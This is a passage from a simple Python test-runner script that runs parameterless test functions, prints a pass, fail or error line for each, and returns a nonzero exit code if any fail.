	failed = 0

	for func in test_funcs:
		name = func.__name__
		try:
			params = list(inspect.signature(func).parameters)
			if params:
				raise TypeError(f"unsupported test signature for {name}: {params}")
			func()
			print(f"  PASS  {name}")
			passed += 1
		except AssertionError as e:
			print(f"  FAIL  {name}: {e}")
			failed += 1
		except Exception as e:
			print(f"  ERROR {name}: {type(e).__name__}: {e}")
			failed += 1

	print(f"\n{passed} passed, {failed} failed, {passed + failed} total")
	return 1 if failed > 0 else 0


if __name__ == "__main__":
	raise SystemExit(main())
